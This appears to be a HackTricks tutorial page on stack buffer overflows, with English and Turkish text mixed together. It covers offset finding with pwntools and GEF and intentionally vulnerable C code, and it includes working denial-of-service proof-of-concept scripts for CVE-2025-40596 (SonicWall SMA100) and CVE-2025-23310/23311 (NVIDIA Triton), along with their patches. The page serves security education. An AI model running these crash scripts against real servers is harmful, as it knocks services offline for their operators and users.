# Stack Overflow

{{#include ../../banners/hacktricks-training.md}}

## What is a Stack Overflow

A **stack overflow** is a vulnerability that occurs when a program writes more data to the stack than it is allocated to hold. This excess data will **overwrite adjacent memory space**, leading to the corruption of valid data, control flow disruption, and potentially the execution of malicious code. This issue often arises due to the use of unsafe functions that do not perform bounds checking on input.

Bir **stack overflow**, bir programın yığına (stack) tutulması için ayrılan alandan daha fazla veri yazması durumunda ortaya çıkan bir güvenlik açığıdır. Bu fazla veri, bitişik bellek alanını **üzerine yazarak** geçerli verinin bozulmasına, kontrol akışının bozulmasına ve potansiyel olarak kötü amaçlı kodun çalıştırılmasına yol açar. Bu sorun genellikle girdide sınır kontrolü yapmayan güvensiz fonksiyonların kullanılmasından kaynaklanır.

The main problem of this overwrite is that the **saved instruction pointer (EIP/RIP)** and the **saved base pointer (EBP/RBP)** to return to the previous function are **stored on the stack**. Therefore, an attacker will be able to overwrite those and **control the execution flow of the program**.

Bu üzerine yazmanın asıl sorunu, önceki fonksiyona dönmek için kullanılan **saved instruction pointer (EIP/RIP)** ve **saved base pointer (EBP/RBP)**'ın **stack'te saklanıyor** olmasıdır. Bu nedenle, bir saldırgan bunların üzerine yazarak programın yürütme akışını **kontrol edebilir**.

The vulnerability usually arises because a function **copies inside the stack more bytes than the amount allocated for it**, therefore being able to overwrite other parts of the stack.

Bu zafiyet genellikle bir fonksiyonun **stack içinde kendisi için ayrılan miktardan daha fazla byte kopyalaması** nedeniyle ortaya çıkar; böylece yığının diğer bölümlerinin üzerine yazılabilir.

Some common functions vulnerable to this are: **`strcpy`, `strcat`, `sprintf`, `gets`**... Also, functions like **`fgets`** , **`read` & `memcpy`** that take a **length argument**, might be used in a vulnerable way if the specified length is greater than the allocated one.

Bu duruma yaygın olarak hassas bazı fonksiyonlar: **`strcpy`, `strcat`, `sprintf`, `gets`**... Ayrıca, bir **uzunluk argümanı** alan **`fgets`**, **`read`** ve **`memcpy`** gibi fonksiyonlar, belirtilen uzunluk ayrılan boyuttan büyükse savunmasız şekilde kullanılabilir.

For example, the following functions could be vulnerable:
```c
void vulnerable() {
char buffer[128];
printf("Enter some text: ");
gets(buffer); // This is where the vulnerability lies
printf("You entered: %s\n", buffer);
}
```
### Finding Stack Overflows offsets

The most common way to find stack overflows is to give a very big input of `A`s (e.g. `python3 -c 'print("A"*1000)'`) and expect a `Segmentation Fault` indicating that the **adres `0x41414141`'e erişilmeye çalışıldığı**.

Moreover, once you found that there is Stack Overflow vulnerability you will need to find the offset until it's possible to **overwrite the return address**, for this it's usually used a **De Bruijn sequence.** Which for a given alphabet of size _k_ and subsequences of length _n_ is a **cyclic sequence in which every possible subsequence of length _n_ appears exactly once** as a contiguous subsequence.

This way, instead of needing to figure out which offset is needed to control the EIP by hand, it's possible to use as padding one of these sequences and then find the offset of the bytes that ended overwriting it.

It's possible to use **pwntools** for this:
```python
from pwn import *

# Generate a De Bruijn sequence of length 1000 with an alphabet size of 256 (byte values)
pattern = cyclic(1000)

# This is an example value that you'd have found in the EIP/IP register upon crash
eip_value = p32(0x6161616c)
offset = cyclic_find(eip_value)  # Finds the offset of the sequence in the De Bruijn pattern
print(f"The offset is: {offset}")
```
veya **GEF**:
```bash
#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp
```
## Stack Overflows'ı İstismar Etme

Bir overflow sırasında (taşma boyutu yeterince büyük varsayıldığında) stack içindeki yerel değişkenlerin değerlerini kaydedilmiş **EBP/RBP and EIP/RIP (or even more)**'e ulaşana dek **overwrite** edebileceksiniz.\
Bu tür bir açığı kötüye kullanmanın en yaygın yolu, fonksiyon sona erdiğinde **control flow**'un bu pointer'da kullanıcının belirttiği yere yönlendirilmesi için **modifying the return address** yapmaktır.

Ancak, diğer senaryolarda sadece stack içindeki bazı değişken değerlerini **overwriting some variables values in the stack** yeterli olabilir (örneğin kolay CTF challenge'larında).

### Ret2win

Bu tip CTF challenge'larında binary içinde **never called** olan ve **you need to call in order to win** olan bir **function** bulunur. Bu tür challenge'larda yapmanız gereken tek şey **offset to overwrite the return address**'i bulmak ve çağırılacak **address of the function**'ı bulmaktır (genellikle [**ASLR**](../common-binary-protections-and-bypasses/aslr/index.html) devre dışı bırakılmış olur) böylece vulnerable function return ettiğinde gizli function çağrılır:


{{#ref}}
ret2win/
{{#endref}}

### Stack Shellcode

Bu senaryoda attacker stack'e bir shellcode yerleştirebilir ve controlled EIP/RIP'i shellcode'a atlamak ve arbitrary code çalıştırmak için kullanabilir:


{{#ref}}
stack-shellcode/
{{#endref}}

### Windows SEH-based exploitation (nSEH/SEH)

32-bit Windows'ta, bir overflow kaydedilmiş return address yerine Structured Exception Handler (SEH) zincirini overwrite edebilir. İstismar genellikle SEH pointer'ını bir POP POP RET gadget ile değiştirir ve 4-byte'lık nSEH alanını shellcode'un bulunduğu büyük buffer'a geri pivot yapmak için kısa bir jump için kullanır. Yaygın bir desen, nSEH içinde kısa bir jmp olup bunun hemen öncesine yerleştirilmiş 5-byte'lık bir near jmp'un payload başlangıcına yüzlerce byte geri atlamasıdır.


{{#ref}}
windows-seh-overflow.md
{{#endref}}

### ROP & Ret2... techniques

Bu teknik, önceki tekniğin ana korumasını aşmak için temel çerçeveyi sağlar: **No executable stack (NX)**. Ayrıca existing instructions in the binary'yi kullanarak arbitrary komutlar çalıştıracak birçok diğer tekniği (ret2lib, ret2syscall...) gerçekleştirmeye olanak tanır:


{{#ref}}
../rop-return-oriented-programing/
{{#endref}}

## Heap Overflows

Bir overflow her zaman stack'te olmak zorunda değildir; örneğin **heap**'te de olabilir:


{{#ref}}
../libc-heap/heap-overflow.md
{{#endref}}

## Koruma Türleri

Zafiyetlerin istismarını önlemeye çalışan çeşitli korumalar vardır, bunları şu yerde inceleyin:


{{#ref}}
../common-binary-protections-and-bypasses/
{{#endref}}

### Gerçek Dünya Örneği: CVE-2025-40596 (SonicWall SMA100)

Neden **`sscanf` should never be trusted for parsing untrusted input** olduğunun iyi bir gösterimi 2025'te SonicWall’ın SMA100 SSL-VPN appliance'ında ortaya çıktı.
`/usr/src/EasyAccess/bin/httpd` içindeki vulnerable rutin, `/__api__/` ile başlayan herhangi bir URI'den version ve endpoint çıkarmaya çalışıyordu:
```c
char version[3];
char endpoint[0x800] = {0};
/* simplified proto-type */
sscanf(uri, "%*[^/]/%2s/%s", version, endpoint);
```
1. İlk dönüşüm (`%2s`) `version` içine güvenli şekilde **iki** bayt depolar (ör. `"v1"`).
2. İkinci dönüşüm (`%s`) **uzunluk belirticisi içermez**, bu yüzden `sscanf` kopyalamaya **ilk NUL byte'a kadar** devam eder.
3. Çünkü `endpoint` **stack** üzerinde bulunur ve **0x800 bayt uzunluğundadır**, 0x800'den uzun bir path sağlamak buffer'ın sonrasında bulunan her şeyi bozar ‑ buna **stack canary** ve **saved return address** da dahildir.

Tek satırlık bir proof-of-concept, çöküşü **authentication** öncesinde tetiklemek için yeterlidir:
```python
import requests, warnings
warnings.filterwarnings('ignore')
url = "https://TARGET/__api__/v1/" + "A"*3000
requests.get(url, verify=False)
```
Stack canaries işlemi sonlandırsa bile, bir saldırgan yine de bir **Denial-of-Service** primitive elde eder (and, with additional information leaks, possibly code-execution). Ders basit:

* Her zaman bir **maksimum alan genişliği** belirtin (örn. `%511s`).
* Daha güvenli alternatifleri tercih edin; örn. `snprintf`/`strncpy_s`.

### Gerçek Dünya Örneği: CVE-2025-23310 & CVE-2025-23311 (NVIDIA Triton Inference Server)

NVIDIA’nin Triton Inference Server (≤ v25.06), HTTP API aracılığıyla ulaşılabilen birden fazla **stack-based overflows** içeriyordu.
Zafiyetli desen `http_server.cc` ve `sagemaker_server.cc` içinde tekrar tekrar ortaya çıkıyordu:
```c
int n = evbuffer_peek(req->buffer_in, -1, NULL, NULL, 0);
if (n > 0) {
/* allocates 16 * n bytes on the stack */
struct evbuffer_iovec *v = (struct evbuffer_iovec *)
alloca(sizeof(struct evbuffer_iovec) * n);
...
}
```
1. `evbuffer_peek` (libevent) mevcut HTTP istek gövdesini oluşturan **dahili buffer segmentlerinin sayısını** döndürür.
2. Her segment `alloca()` aracılığıyla **stack** üzerinde **16-byte** büyüklüğünde bir `evbuffer_iovec` ayrılmasına neden olur – **herhangi bir üst sınır olmadan**.
3. Bir istemci **HTTP _chunked transfer-encoding_**'i kötüye kullanarak isteğin **yüzbinlerce 6-byte parçaya** (`"1\r\nA\r\n"`) bölünmesini sağlayabilir. Bu, `n`'in stack tükenene kadar sınırsız şekilde artmasına yol açar.

#### Kavram Kanıtı (DoS)
```python
#!/usr/bin/env python3
import socket, sys

def exploit(host="localhost", port=8000, chunks=523_800):
s = socket.create_connection((host, port))
s.sendall((
f"POST /v2/models/add_sub/infer HTTP/1.1\r\n"
f"Host: {host}:{port}\r\n"
"Content-Type: application/octet-stream\r\n"
"Inference-Header-Content-Length: 0\r\n"
"Transfer-Encoding: chunked\r\n"
"Connection: close\r\n\r\n"
).encode())

for _ in range(chunks):                  # 6-byte chunk ➜ 16-byte alloc
s.send(b"1\r\nA\r\n")            # amplification factor ≈ 2.6x
s.sendall(b"0\r\n\r\n")               # end of chunks
s.close()

if __name__ == "__main__":
exploit(*sys.argv[1:])
```
Varsayılan bir derlemede yaklaşık ~3 MB'lık bir istek, kaydedilmiş dönüş adresini ezerek daemon'ı **crash** ettirmek için yeterlidir.

#### Yama ve Hafifletme
25.07 sürümü, güvensiz stack tahsisini **heap-backed `std::vector`** ile değiştirir ve `std::bad_alloc` durumunu düzgün şekilde ele alır:
```c++
std::vector<evbuffer_iovec> v_vec;
try {
v_vec = std::vector<evbuffer_iovec>(n);
} catch (const std::bad_alloc &e) {
return TRITONSERVER_ErrorNew(TRITONSERVER_ERROR_INVALID_ARG, "alloc failed");
}
struct evbuffer_iovec *v = v_vec.data();
```
Öğrenilen dersler:
* Asla `alloca()`'yı saldırgan tarafından kontrol edilen boyutlarla çağırmayın.
* Chunked requests sunucu tarafı tamponların şeklini önemli ölçüde değiştirebilir.
* İstemci girdisinden türetilen herhangi bir değeri, bellek ayırmalarında kullanmadan *önce* doğrulayın / sınırlandırın.

## Kaynaklar
* [watchTowr Labs – Stack Overflows, Heap Overflows and Existential Dread (SonicWall SMA100)](https://labs.watchtowr.com/stack-overflows-heap-overflows-and-existential-dread-sonicwall-sma100-cve-2025-40596-cve-2025-40597-and-cve-2025-40598/)
* [Trail of Bits – Uncovering memory corruption in NVIDIA Triton](https://blog.trailofbits.com/2025/08/04/uncovering-memory-corruption-in-nvidia-triton-as-a-new-hire/)
* [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)

{{#include ../../banners/hacktricks-training.md}}
